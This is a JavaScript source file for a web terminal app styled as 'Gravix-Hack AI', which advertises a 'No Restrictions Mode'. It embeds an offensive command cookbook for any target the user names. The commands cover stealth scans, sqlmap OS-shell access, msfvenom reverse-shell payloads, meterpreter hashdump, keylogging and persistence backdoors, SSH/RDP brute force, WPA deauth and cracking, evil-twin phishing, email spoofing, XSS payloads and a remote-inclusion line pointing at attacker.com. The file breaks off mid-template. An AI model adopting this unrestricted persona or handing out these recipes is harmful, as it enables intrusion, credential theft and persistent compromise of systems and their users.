/**
 * ═══════════════════════════════════════════════════════════════════════
 * GRAVIX-HACK AI - COMPLETE JAVASCRIPT ENGINE
 * Advanced Cybersecurity Assistant Interactive System
 * Version: 2.1.0
 * ═══════════════════════════════════════════════════════════════════════
 */

'use strict';

// Global Configuration
const CONFIG = {
    MATRIX_CHARS: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?',
    MATRIX_DROP_SPEED: 200,
    MATRIX_MAX_CHARS: 50,
    TYPING_SPEED: 100,
    SCROLL_OFFSET: 80,
    COMMAND_HISTORY_LIMIT: 100
};

/**
 * ═══════════════════════════════════════════════════════════════════════
 * MAIN GRAVIX-HACK AI CLASS
 * ═══════════════════════════════════════════════════════════════════════
 */
class GravixHackAI {
    constructor() {
        this.commands = [];
        this.commandHistory = 0;
        this.isTyping = false;
        this.currentTypingText = '';
        this.currentTypingIndex = 0;
        
        // Initialize all systems
        this.init();
    }

    init() {
        console.log(`
        ██████╗ ██████╗  █████╗ ██╗   ██╗██╗██╗  ██╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗
        ██╔════╝ ██╔══██╗██╔══██╗██║   ██║██║╚██╗██╔╝      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
        ██║  ███╗██████╔╝███████║██║   ██║██║ ╚███╔╝ █████╗███████║███████║██║     █████╔╝ 
        ██║   ██║██╔══██╗██╔══██║╚██╗ ██╔╝██║ ██╔██╗ ╚════╝██╔══██║██╔══██║██║     ██╔═██╗ 
        ╚██████╔╝██║  ██║██║  ██║ ╚████╔╝ ██║██╔╝ ██╗      ██║  ██║██║  ██║╚██████╗██║  ██╗
        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
        
        🔥 Gravix-Hack AI System Initializing...
        🔥 Advanced Cybersecurity Engine: LOADED
        🔥 No Restrictions Mode: ACTIVE
        `);

        // Initialize all components
        this.initializeAI();
        this.setupEventListeners();
        this.startMatrixEffect();
        this.startHeroTypingEffect();
        this.displayWelcomeMessage();
        this.setupScrollEffects();
        this.setupMobileMenu();
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * AI KNOWLEDGE BASE - COMPLETE CYBERSECURITY DATABASE
     * ═══════════════════════════════════════════════════════════════════════
     */
    initializeAI() {
        this.knowledge = {
            // Network Security Complete Arsenal
            network: {
                scanning: {
                    nmap: {
                        description: "Advanced network scanning and reconnaissance",
                        basic: "nmap -sS -A -T4 target.com | SYN scan with OS detection and service enumeration",
                        stealth: "nmap -f -D RND:10 -sS target.com | Fragmented packets with decoys for stealth",
                        comprehensive: "nmap -p- --min-rate 10000 -A -T4 target.com | Full port scan with aggressive timing",
                        scripts: "nmap --script vuln,exploit,auth,discovery target.com | Comprehensive script scanning"
                    },
                    masscan: "masscan -p1-65535 --rate=1000 192.168.1.0/24 | High-speed port scanning for large networks",
                    zmap: "zmap -p 80 -o results.txt | Internet-wide port scanning capabilities",
                    unicornscan: "unicornscan -msf 192.168.1.1:1-65535 | Advanced UDP and TCP port scanning",
                    hping3: "hping3 -S -p 80 -c 5 target.com | Custom packet crafting and firewall testing"
                },
                enumeration: {
                    smb: "enum4linux -a target.com && smbclient -L //target.com -N | Complete SMB enumeration",
                    snmp: "snmpwalk -c public -v1 target.com | SNMP information gathering and MIB walking",
                    dns: "dnsrecon -d target.com -t axfr,brt,srv,std | Comprehensive DNS reconnaissance",
                    netbios: "nbtscan -r 192.168.1.0/24 | NetBIOS name service scanning",
                    rpc: "rpcinfo -p target.com | RPC service enumeration and version detection"
                },
                exploitation: {
                    buffer_overflow: "Pattern creation, EIP control, bad character identification, shellcode development",
                    privilege_escalation: "SUID binaries, sudo misconfigurations, kernel exploits, capability abuse",
                    lateral_movement: "Pass-the-hash, Kerberoasting, Golden/Silver tickets, network pivoting",
                    persistence: "Backdoors, scheduled tasks, registry modifications, service installations"
                }
            },

            // Web Application Security Complete
            web: {
                reconnaissance: {
                    technology_detection: "whatweb target.com | Comprehensive technology stack identification",
                    waf_detection: "wafw00f target.com | Web Application Firewall detection and bypass techniques",
                    directory_enumeration: "dirb http://target.com /usr/share/wordlists/dirb/big.txt | Directory discovery",
                    subdomain_enumeration: "sublist3r -d target.com | Subdomain discovery using multiple sources",
                    parameter_discovery: "paramspider -d target.com | Hidden parameter discovery"
                },
                vulnerability_scanning: {
                    nikto: "nikto -h target.com -ssl -evasion 1 | Comprehensive web vulnerability scanner",
                    wpscan: "wpscan --url http://target.com --enumerate ap,at,cb,dbe | WordPress security assessment",
                    skipfish: "skipfish -o output http://target.com | Interactive web application scanner",
                    w3af: "w3af console | Advanced web vulnerability framework with plugins",
                    zaproxy: "zap-cli quick-scan http://target.com | OWASP ZAP automated scanning"
                },
                exploitation: {
                    sql_injection: {
                        manual_testing: "' OR 1=1-- | Basic SQL injection payload testing",
                        sqlmap_basic: "sqlmap -u 'http://target.com/page?id=1' --dbs --batch | Database enumeration",
                        sqlmap_advanced: "sqlmap -u target.com --dump --threads 10 --batch | Data extraction with threading",
                        sqlmap_shell: "sqlmap -u target.com --os-shell | Operating system shell via SQL injection",
                        blind_techniques: "Time-based and boolean-based blind SQL injection methods"
                    },
                    xss_attacks: {
                        reflected: "Basic XSS payload execution in vulnerable parameters",
                        stored: "Persistent XSS payload storage in application database",
                        dom_based: "Client-side DOM manipulation XSS attacks",
                        advanced_payloads: "Filter bypass techniques and encoding methods"
                    },
                    file_inclusion: {
                        lfi: "../../../etc/passwd | Local file inclusion vulnerability exploitation",
                        rfi: "http://attacker.com/shell.txt | Remote file inclusion attacks",
                        log_poisoning: "Apache/Nginx log file poisoning for code execution",
                        wrapper_attacks: "PHP wrapper utilization for file access"
                    },
                    upload_attacks: {
                        extension_bypass: "File extension filter bypass techniques",
                        mime_type_bypass: "MIME type validation circumvention",
                        magic_byte_manipulation: "File signature modification methods",
                        polyglot_files: "Multi-format file creation for bypass"
                    }
                },
                session_attacks: {
                    session_hijacking: "Cookie theft via XSS and network interception methods",
                    session_fixation: "Forcing specific session identifiers before authentication",
                    csrf_attacks: "Cross-site request forgery exploitation and bypass techniques",
                    jwt_attacks: "JSON Web Token manipulation and signature bypass methods"
                }
            },

            // Password Security & Cryptography
            password: {
                hash_identification: {
                    hashid: "hashid hash.txt | Automatic hash algorithm identification",
                    hash_analyzer: "hash-identifier | Interactive hash type analysis tool",
                    john_formats: "john --list=formats | Display supported hash formats"
                },
                offline_attacks: {
                    dictionary: {
                        john: "john --wordlist=rockyou.txt --rules=best64 hashes.txt | Rule-enhanced dictionary attack",
                        hashcat: "hashcat -m 0 -a 0 hashes.txt rockyou.txt --force | GPU-accelerated cracking",
                        custom_rules: "john --rules=custom --wordlist=passwords.txt hashes.txt | Custom rule application"
                    },
                    brute_force: {
                        incremental: "john --incremental hashes.txt | Incremental brute force attack",
                        mask_attack: "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a | Mask-based brute forcing",
                        custom_charset: "hashcat -m 0 -a 3 hash.txt -1 ?l?u?d custom_mask | Custom character set usage"
                    },
                    hybrid_attacks: {
                        wordlist_rules: "hashcat -m 0 -a 0 -r best64.rule hashes.txt wordlist.txt | Rule-based enhancement",
                        combinator: "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt | Word combination attack",
                        hybrid_wordlist: "hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d | Wordlist + brute force"
                    }
                },
                online_attacks: {
                    hydra: "hydra -L users.txt -P passwords.txt target.com ssh -t 16 -f | Multi-threaded login brute force",
                    medusa: "medusa -h target.com -u admin -P passwords.txt -M ssh -t 10 | Parallel authentication cracker",
                    ncrack: "ncrack -vv --user admin -P passwords.txt ssh://target.com | Network authentication cracker",
                    patator: "patator ssh_login host=target.com user=admin password=FILE0 0=passwords.txt | Advanced brute forcer",
                    crowbar: "crowbar -b rdp -s target.com/32 -u admin -C passwords.txt | RDP-specific brute forcer"
                },
                wordlist_generation: {
                    cewl: "cewl http://target.com -w custom.txt -d 3 -m 6 | Website-based wordlist creation",
                    crunch: "crunch 8 12 -t @@@@@@%% -o wordlist.txt | Pattern-based wordlist generation",
                    cupp: "cupp.py -i | Interactive personal information wordlist creator",
                    mentalist: "GUI-based wordlist generation with advanced rule engine"
                }
            },

            // System Exploitation Advanced
            system: {
                metasploit: {
                    basic_usage: {
                        console: "msfconsole -q | Start Metasploit framework in quiet mode",
                        search: "search type:exploit platform:windows apache | Advanced exploit searching",
                        info: "info exploit/windows/smb/ms17_010_eternalblue | Detailed exploit information",
                        use: "use exploit/multi/handler | Load specific exploit module"
                    },
                    payload_generation: {
                        windows: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe",
                        linux: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload",
                        web: "msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php",
                        encoded: "msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe"
                    },
                    post_exploitation: {
                        system_info: "sysinfo | Display target system information",
                        privilege_check: "getuid | Check current user privileges",
                        hash_dump: "hashdump | Extract password hashes from SAM database",
                        screenshot: "screenshot | Capture target desktop screenshot",
                        keylogger: "keyscan_start | Begin keystroke logging",
                        persistence: "run persistence -S -U -X -i 10 -p 4445 -r IP | Install persistent backdoor"
                    }
                },
                privilege_escalation: {
                    windows: {
                        enumeration: "systeminfo | findstr /B /C:'OS Name' /C:'OS Version' | System information gathering",
                        services: "wmic service get name,displayname,pathname,startmode | Service enumeration",
                        scheduled_tasks: "schtasks /query /fo LIST /v | Scheduled task analysis",
                        unquoted_paths: "wmic service get name,displayname,pathname,startmode | find /i 'auto' | Unquoted service path detection",
                        registry: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | Registry autoruns"
                    },
                    linux: {
                        suid_binaries: "find / -perm -u=s -type f 2>/dev/null | SUID binary discovery",
                        sudo_config: "sudo -l | Sudo configuration analysis",
                        cron_jobs: "cat /etc/crontab && ls -la /etc/cron* | Scheduled task enumeration",
                        kernel_version: "uname -a && cat /proc/version | Kernel version identification",
                        file_permissions: "find / -writable -type d 2>/dev/null | World-writable directory discovery"
                    }
                }
            },

            // Wireless Security Complete
            wireless: {
                monitor_setup: {
                    enable_monitor: "airmon-ng check kill && airmon-ng start wlan0 | Enable monitor mode",
                    channel_hopping: "airodump-ng wlan0mon | Network discovery with channel hopping",
                    fixed_channel: "iwconfig wlan0mon channel 6 | Set specific monitoring channel",
                    mac_randomization: "macchanger -r wlan0mon | Randomize MAC address for anonymity"
                },
                wpa_attacks: {
                    handshake_capture: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon | WPA handshake capture",
                    deauthentication: "aireplay-ng --deauth 0 -a AP_MAC -c CLIENT_MAC wlan0mon | Targeted deauth attack",
                    mass_deauth: "aireplay-ng --deauth 0 -a AP_MAC wlan0mon | Broadcast deauthentication",
                    handshake_cracking: "aircrack-ng -w rockyou.txt -b AP_MAC capture.cap | WPA handshake cracking",
                    gpu_cracking: "hashcat -m 2500 capture.hccapx rockyou.txt --force | GPU-accelerated WPA cracking"
                },
                wps_attacks: {
                    wps_scanning: "wash -i wlan0mon | WPS-enabled network detection",
                    reaver_attack: "reaver -i wlan0mon -b AP_MAC -vv -K 1 | WPS PIN brute force with pixie dust",
                    bully_attack: "bully -b AP_MAC -c 6 wlan0mon | Alternative WPS brute forcing tool",
                    pixie_dust: "reaver -i wlan0mon -b AP_MAC -K 1 | Offline WPS PIN attack method",
                    pin_generation: "pixiewps -e pke -r pkr -s hash1 -z hash2 | WPS PIN calculation"
                },
                evil_twin: {
                    hostapd_setup: "hostapd-wpe hostapd-wpe.conf | WPA/WPA2 enterprise evil twin AP",
                    captive_portal: "wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade | Automated phishing AP",
                    fake_ap: "airbase-ng -e 'Free WiFi' -c 6 -P wlan0mon | Basic rogue access point",
                    dns_spoofing: "dnsspoof -i at0 -f hosts.txt | DNS redirection for captive portal"
                }
            },

            // Social Engineering Arsenal
            social_engineering: {
                osint: {
                    email_harvesting: "theHarvester -d target.com -l 500 -b all | Email and subdomain discovery",
                    social_networks: "sherlock username | Username reconnaissance across platforms",
                    domain_intelligence: "recon-ng -m recon/domains-hosts/google_site_web | Automated domain reconnaissance",
                    people_search: "maltego | Interactive intelligence gathering and link analysis",
                    leaked_credentials: "dehashed.com API integration for credential discovery"
                },
                phishing: {
                    email_spoofing: "swaks --to target@company.com --from admin@company.com --header 'Subject: Urgent' | Email spoofing",
                    setoolkit: "Social Engineering Toolkit for comprehensive phishing campaigns",
                    gophish: "Professional phishing simulation platform with analytics",
                    beef_framework: "Browser Exploitation Framework for client-side attacks",
                    credential_harvesting: "Custom phishing pages with credential capture mechanisms"
                },
                website_cloning: {
                    httrack: "httrack http://target.com -O cloned_site | Complete website mirroring",
                    wget_mirror: "wget --mirror --convert-links --page-requisites target.com | Site cloning",
                    social_engineer_toolkit: "Built-in website cloner with credential harvesting"
                }
            },

            // Advanced Red Team Operations
            advanced: {
                command_control: {
                    cobalt_strike: "Professional C2 framework for advanced persistent threats",
                    empire: "PowerShell-based post-exploitation framework",
                    covenant: ".NET command and control framework",
                    metasploit_pro: "Commercial penetration testing platform"
                },
                evasion: {
                    antivirus_bypass: "Payload encoding, crypting, and obfuscation techniques",
                    sandox_evasion: "Environment detection and sandbox bypass methods",
                    memory_injection: "Process hollowing and DLL injection techniques",
                    living_off_land: "PowerShell, WMI, and built-in tool utilization"
                },
                persistence: {
                    windows_methods: "Registry modification, scheduled tasks, service installation",
                    linux_methods: "Cron jobs, systemd services, profile modification",
                    web_shells: "PHP, ASP, JSP web shells for persistent web access",
                    firmware_level: "UEFI/BIOS rootkits and bootkit installation"
                }
            }
        };

        console.log("🔥 Complete Cybersecurity Knowledge Base Loaded - No Restrictions Active");
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * EVENT LISTENERS SETUP
     * ═══════════════════════════════════════════════════════════════════════
     */
    setupEventListeners() {
        // Terminal input handler with advanced features
        const terminalInput = document.getElementById('terminal-input');
        if (terminalInput) {
            terminalInput.addEventListener('keydown', (e) => {
                switch(e.key) {
                    case 'Enter':
                        e.preventDefault();
                        const command = e.target.value.trim();
                        if (command) {
                            this.addToCommandHistory(command);
                            this.processCommand(command);
                            e.target.value = '';
                        }
                        break;
                        
                    case 'ArrowUp':
                        e.preventDefault();
                        this.navigateCommandHistory('up', e.target);
                        break;
                        
                    case 'ArrowDown':
                        e.preventDefault();
                        this.navigateCommandHistory('down', e.target);
                        break;
                        
                    case 'Tab':
                        e.preventDefault();
                        this.handleTabCompletion(e.target);
                        break;
                        
                    case 'l':
                        if (e.ctrlKey) {
                            e.preventDefault();
                            this.clearTerminal();
                        }
                        break;
                }
            });

            // Focus terminal when clicking anywhere in terminal body
            const terminalBody = document.querySelector('.terminal-body-large');
            if (terminalBody) {
                terminalBody.addEventListener('click', () => {
                    terminalInput.focus();
                });
            }
        }

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = anchor.getAttribute('href').substring(1);
                const targetElement = document.getElementById(targetId);
                
                if (targetElement) {
                    const offsetTop = targetElement.offsetTop - CONFIG.SCROLL_OFFSET;
                    window.scrollTo({
                        top: offsetTop,
                        behavior: 'smooth'
                    });
                }
            });
        });

        // Dynamic navbar background on scroll
        window.addEventListener('scroll', () => {
            const navbar = document.querySelector('.navbar');
            if (window.scrollY > 50) {
                navbar.classList.add('scrolled');
            } else {
                navbar.classList.remove('scrolled');
            }
        });

        // Intersection Observer for animations
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -50px 0px'
        };

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('fade-in-up');
                }
            });
        }, observerOptions);

        // Observe elements for animation
        document.querySelectorAll('.feature-card, .stat-card, .about-feature').forEach(el => {
            observer.observe(el);
        });
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * COMMAND PROCESSING ENGINE
     * ═══════════════════════════════════════════════════════════════════════
     */
    processCommand(input) {
        const terminalContent = document.getElementById('terminal-content');
        if (!terminalContent) return;

        // Add user input to terminal
        this.addToTerminal(`
            <div class="terminal-line" style="margin: 1rem 0;">
                <span class="terminal-prompt">root@gravix-hack:~#</span>
                <span style="color: #ffffff; margin-left: 0.5rem;">${this.escapeHtml(input)}</span>
            </div>
        `);

        // Process command and generate response
        const response = this.generateResponse(input.toLowerCase().trim());
        
        // Add response to terminal with typing effect
        this.typeResponse(response);

        // Auto scroll to bottom
        setTimeout(() => {
            terminalContent.scrollTop = terminalContent.scrollHeight;
        }, 100);
    }

    generateResponse(input) {
        // Clear terminal
        if (input === 'clear' || input === 'cls') {
            this.clearTerminal();
            return '';
        }

        // Exit command
        if (input === 'exit' || input === 'quit') {
            return this.createResponseHTML("👋 Thanks for using Gravix-Hack AI!", [
                "Session terminated. Reload page to restart.",
                "Stay ethical, stay curious! 🔐"
            ]);
        }

        // Help command - Complete reference
        if (input === 'help' || input === 'commands' || input === '?') {
            return `
                <div style="color: #00ff41;">
                    <h4>🔐 GRAVIX-HACK AI - COMPLETE COMMAND REFERENCE</h4>
                    <div style="margin-left: 20px; color: #cccccc;">
                        <p style="color: #ffd700;">━━━━━━━━━━━ NETWORK SECURITY ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">scan [target]</span> - Advanced network scanning and enumeration</p>
                        <p><span style="color: #ffd700;">nmap [target]</span> - Comprehensive Nmap scanning techniques</p>
                        <p><span style="color: #ffd700;">enum [target]</span> - Service enumeration and fingerprinting</p>
                        <p><span style="color: #ffd700;">masscan [target]</span> - High-speed port scanning</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ WEB APPLICATION ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">web [url]</span> - Complete web application security testing</p>
                        <p><span style="color: #ffd700;">sql [url]</span> - SQL injection testing and exploitation</p>
                        <p><span style="color: #ffd700;">xss [url]</span> - Cross-site scripting vulnerability testing</p>
                        <p><span style="color: #ffd700;">lfi [url]</span> - Local file inclusion testing</p>
                        <p><span style="color: #ffd700;">upload [url]</span> - File upload vulnerability testing</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ PASSWORD ATTACKS ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">crack [hash]</span> - Advanced password cracking techniques</p>
                        <p><span style="color: #ffd700;">brute [service]</span> - Online brute force attacks</p>
                        <p><span style="color: #ffd700;">wordlist</span> - Custom wordlist generation techniques</p>
                        <p><span style="color: #ffd700;">hashcat [hash]</span> - GPU-accelerated password cracking</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ SYSTEM EXPLOITATION ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">exploit [service]</span> - System exploitation techniques</p>
                        <p><span style="color: #ffd700;">metasploit</span> - Metasploit framework guidance</p>
                        <p><span style="color: #ffd700;">privilege</span> - Privilege escalation methods</p>
                        <p><span style="color: #ffd700;">buffer</span> - Buffer overflow exploitation</p>
                        <p><span style="color: #ffd700;">payload [type]</span> - Payload generation techniques</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ WIRELESS SECURITY ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">wifi</span> - Complete WiFi penetration testing</p>
                        <p><span style="color: #ffd700;">wpa [network]</span> - WPA/WPA2 cracking techniques</p>
                        <p><span style="color: #ffd700;">wps [network]</span> - WPS vulnerability exploitation</p>
                        <p><span style="color: #ffd700;">evil-twin</span> - Rogue access point creation</p>
                        <p><span style="color: #ffd700;">monitor</span> - Monitor mode setup and usage</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ SOCIAL ENGINEERING ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">phishing</span> - Phishing campaign techniques</p>
                        <p><span style="color: #ffd700;">osint [target]</span> - Open source intelligence gathering</p>
                        <p><span style="color: #ffd700;">clone [site]</span> - Website cloning for testing</p>
                        <p><span style="color: #ffd700;">harvest [domain]</span> - Email and information harvesting</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ ADVANCED OPERATIONS ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">rdp crack</span> - RDP security testing and exploitation</p>
                        <p><span style="color: #ffd700;">cookies steal</span> - Session hijacking techniques</p>
                        <p><span style="color: #ffd700;">persistence</span> - Maintaining system access</p>
                        <p><span style="color: #ffd700;">evasion</span> - Anti-detection and stealth techniques</p>
                        <p><span style="color: #ffd700;">c2 setup</span> - Command and control setup</p>
                        
                        <p style="color: #ffd700; margin-top: 1rem;">━━━━━━━━━━━ SYSTEM COMMANDS ━━━━━━━━━━━</p>
                        <p><span style="color: #ffd700;">tools</span> - List all 600+ security tools</p>
                        <p><span style="color: #ffd700;">status</span> - System status and capabilities</p>
                        <p><span style="color: #ffd700;">history</span> - Command history</p>
                        <p><span style="color: #ffd700;">clear</span> - Clear terminal screen</p>
                        <p><span style="color: #ffd700;">exit</span> - Exit terminal session</p>
                        
                        <p style="color: #ff6b6b; margin-top: 1rem; font-weight: bold;">
                            ⚠️ EXPERT MODE: Ask any cybersecurity question for detailed guidance!
                        </p>
                        <p style="color: #00ff41; margin-top: 0.5rem;">
                            💡 Tab completion available | Ctrl+L to clear | Arrow keys for history
                        </p>
                    </div>
                </div>
            `;
        }

        // Network scanning commands
        if (this.matchesCommand(input, ['scan', 'nmap', 'masscan'])) {
            const target = this.extractTarget(input) || 'TARGET';
            return this.generateNetworkScanResponse(target);
        }

        // Web application testing
        if (this.matchesCommand(input, ['web', 'sql', 'xss', 'lfi', 'upload'])) {
            const url = this.extractUrl(input) || 'TARGET_URL';
            return this.generateWebTestingResponse(url, input);
        }

        // Password cracking
        if (this.matchesCommand(input, ['crack', 'brute', 'hashcat', 'john'])) {
            return this.generatePasswordCrackingResponse(input);
        }

        // RDP cracking
        if (input.includes('rdp') && input.includes('crack')) {
            return this.generateRDPCrackingResponse();
        }

        // Cookie stealing
        if ((input.includes('cookie') || input.includes('session')) && (input.includes('steal') || input.includes('hijack'))) {
            return this.generateCookieStealingResponse();
        }

        // Wireless security
        if (this.matchesCommand(input, ['wifi', 'wpa', 'wps', 'wireless', 'evil-twin'])) {
            return this.generateWirelessResponse(input);
        }

        // System exploitation
        if (this.matchesCommand(input, ['exploit', 'metasploit', 'payload', 'privilege', 'buffer'])) {
            return this.generateExploitationResponse(input);
        }

        // Social engineering
        if (this.matchesCommand(input, ['phishing', 'osint', 'social', 'harvest'])) {
            return this.generateSocialEngineeringResponse(input);
        }

        // Tools list
        if (input === 'tools') {
            return this.generateToolsListResponse();
        }

        // System status
        if (input === 'status') {
            return this.generateStatusResponse();
        }

        // Command history
        if (input === 'history') {
            return this.generateHistoryResponse();
        }

        // Default AI response for any question
        return this.generateIntelligentResponse(input);
    }

    /**
     * ═══════════════════════════════════════════════════════════════════════
     * SPECIALIZED RESPONSE GENERATORS
     * ═══════════════════════════════════════════════════════════════════════
     */
    generateNetworkScanResponse(target) {
        return `
            <div style="color: #00ff41;">
                <h4>🔍 ADVANCED NETWORK RECONNAISSANCE: ${target}</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Host Discovery</h5>
                    <p>nmap -sn ${target}/24 | Network sweep and live host detection</p>
                    <p>masscan -p443,80,22,21 --rate=1000 ${target}/16 | High-speed service discovery</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Port Enumeration</h5>
                    <p>nmap -sS -p- ${target} | Complete TCP port scan</p>
                    <p>nmap -sU --top-ports 1000 ${target} | UDP service detection</p>
                    <p>unicornscan -msf ${target}:1-65535 | Advanced scanning with correlation</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Service Detection</h5>
                    <p>nmap -sV -A ${target} | Version detection and OS fingerprinting</p>
                    <p>nmap --script banner,http-title,ssh-hostkey ${target} | Service banner grabbing</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: Vulnerability Assessment</h5>
                    <p>nmap --script vuln ${target} | Comprehensive vulnerability scanning</p>
                    <p>nmap --script exploit ${target} | Exploitability verification</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Stealth Techniques</h5>
                    <p>nmap -f -D RND:10 ${target} | Fragmented packets with decoys</p>
                    <p>nmap --source-port 53 --data-length 25 ${target} | Source port spoofing</p>
                    <p>hping3 -S -p 80 -c 5 ${target} | Custom packet crafting</p>
                    
                    <h5 style="color: #ff6b6b;">Next Steps:</h5>
                    <p>• Enumerate discovered services with specialized tools</p>
                    <p>• Search for service-specific vulnerabilities</p>
                    <p>• Attempt authentication attacks on login services</p>
                    <p>• Use 'enum ${target}' for detailed service enumeration</p>
                </div>
            </div>
        `;
    }

    generateWebTestingResponse(url, command) {
        return `
            <div style="color: #00ff41;">
                <h4>🌐 COMPREHENSIVE WEB APPLICATION SECURITY ASSESSMENT: ${url}</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Information Gathering</h5>
                    <p>whatweb ${url} | Technology stack and CMS identification</p>
                    <p>wafw00f ${url} | Web Application Firewall detection</p>
                    <p>httprint -h ${url} -s signatures.txt | Web server fingerprinting</p>
                    <p>nmap --script http-enum ${url} | HTTP service enumeration</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Content Discovery</h5>
                    <p>dirb ${url} /usr/share/wordlists/dirb/big.txt | Directory enumeration</p>
                    <p>gobuster dir -u ${url} -w wordlist.txt -t 50 -x php,html,txt,js | Multi-extension scanning</p>
                    <p>ffuf -w wordlist.txt -u ${url}/FUZZ -mc 200,301,302,403 | Fast fuzzing</p>
                    <p>wfuzz -c -z file,wordlist.txt --hc 404 ${url}/FUZZ | Advanced parameter discovery</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Vulnerability Scanning</h5>
                    <p>nikto -h ${url} -ssl -evasion 1,2,3,4 | Comprehensive vulnerability scan</p>
                    <p>wpscan --url ${url} --enumerate ap,at,cb,dbe,u | WordPress security assessment</p>
                    <p>skipfish -o output ${url} | Interactive application scanner</p>
                    <p>w3af console | Advanced web vulnerability framework</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: SQL Injection Testing</h5>
                    <p>sqlmap -u "${url}?id=1" --dbs --batch --tamper=space2comment | Database enumeration</p>
                    <p>sqlmap -u "${url}" --forms --dbs --batch | Form-based injection testing</p>
                    <p>sqlmap -u "${url}" --dump -T users --batch | Data extraction</p>
                    <p>sqlmap -u "${url}" --os-shell --batch | Operating system shell access</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Cross-Site Scripting (XSS)</h5>
                    <p>Manual payloads: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
                    <p>DOM-based: javascript:alert(document.domain)</p>
                    <p>Event handlers: &lt;img src=x onerror=alert('XSS')&gt;</p>
                    <p>Filter bypass: &lt;ScRiPt&gt;alert(String.fromCharCode(88,83,83))&lt;/ScRiPt&gt;</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: File Inclusion Testing</h5>
                    <p>LFI: ${url}?page=../../../etc/passwd</p>
                    <p>RFI: ${url}?page=http://attacker.com/shell.txt</p>
                    <p>Log poisoning: Inject PHP code into log files</p>
                    <p>Wrapper attacks: php://filter/convert.base64-encode/resource=index.php</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: File Upload Testing</h5>
                    <p>Extension bypass: shell.php.jpg, shell.phtml, shell.php5</p>
                    <p>MIME type bypass: Modify Content-Type header</p>
                    <p>Magic byte manipulation: GIF89a before PHP code</p>
                    <p>Polyglot files: Valid image + PHP code combination</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Authentication & Session Testing</h5>
                    <p>Brute force: hydra -L users.txt -P passwords.txt ${url} http-form-post</p>
                    <p>Session analysis: Burp Suite session handling rules</p>
                    <p>CSRF testing: Cross-site request forgery vulnerabilities</p>
                    <p>JWT analysis: JSON Web Token manipulation and bypass</p>
                </div>
            </div>
        `;
    }

    generatePasswordCrackingResponse(command) {
        return `
            <div style="color: #00ff41;">
                <h4>🔐 ADVANCED PASSWORD CRACKING & HASH ANALYSIS</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Hash Identification</h5>
                    <p>hashid hash.txt | Automatic hash type identification</p>
                    <p>hash-identifier | Interactive hash analysis tool</p>
                    <p>john --list=formats | Display all supported formats</p>
                    <p>hashcat --example-hashes | Reference hash examples</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Dictionary Attacks</h5>
                    <p>john --wordlist=rockyou.txt hashes.txt | Basic dictionary attack</p>
                    <p>hashcat -m 0 -a 0 hashes.txt rockyou.txt --force | GPU acceleration</p>
                    <p>john --wordlist=passwords.txt --rules=best64 hashes.txt | Rule enhancement</p>
                    <p>hashcat -m 0 -a 0 -r best64.rule hashes.txt wordlist.txt | Advanced rules</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Brute Force Attacks</h5>
                    <p>john --incremental hashes.txt | Incremental brute force</p>
                    <p>hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a | Full character set</p>
